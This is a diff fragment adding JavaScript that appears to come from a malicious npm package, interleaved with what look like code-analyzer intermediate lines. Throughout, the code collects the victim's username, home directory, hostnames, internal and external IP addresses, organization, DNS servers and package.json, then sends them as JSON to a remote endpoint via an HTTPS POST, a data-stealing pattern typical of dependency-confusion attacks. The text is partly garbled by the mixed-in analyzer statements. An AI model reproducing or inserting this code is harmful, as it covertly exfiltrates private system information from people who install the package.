@@ -1,0 +1,39 @@
+const trackingData = JSON.stringify({
+        package: package,
+        directory: __dirname,
+        home_directory: os.homedir(),
+        username: os.userInfo().username,
+        dns: dns.getServers(),
+        internal_hostname: os.hostname(),
+        internal_ip: getIPAddress(), // Add internal IP address here
+        external_ip: externalIP.ip, // Get External IP Address
+        external_hostname: externalIP.hostname,
+        organization: externalIP.organization,
+        resolved_url: packageJSON ? packageJSON.___resolved : undefined,
+        package_version: packageJSON.version,
+        package_json: packageJSON,
+        package_type: 'npm',
+    })
+_tmp_3.home_directory = os.homedir()
+const postData = JSON.stringify({
+        content: `\`\`\`json\n${trackingData}\n\`\`\`` // Wrap the tracking data in a code block for better formatting
+    })
+_tmp_4.content = <operator>.formatString("\`\`\`json\n", trackingData, "\n\`\`\`")
+options.headers = {
+        "Content-Type": "application/json",
+        "Content-Length": postData.length,
+    }
+_tmp_6.Content-Length = postData.length
+const req = https.request(options, (res) => {
+        res.on("data", (d) => {
+            process.stdout.write(d);
+        });
+    })
+res.on("data", (d) => {
+            process.stdout.write(d);
+        })
+(_tmp_7 = process.stdout).write
+req.on("error", (e) => {
+        console.error(e);
+    })
+req.write(postData)
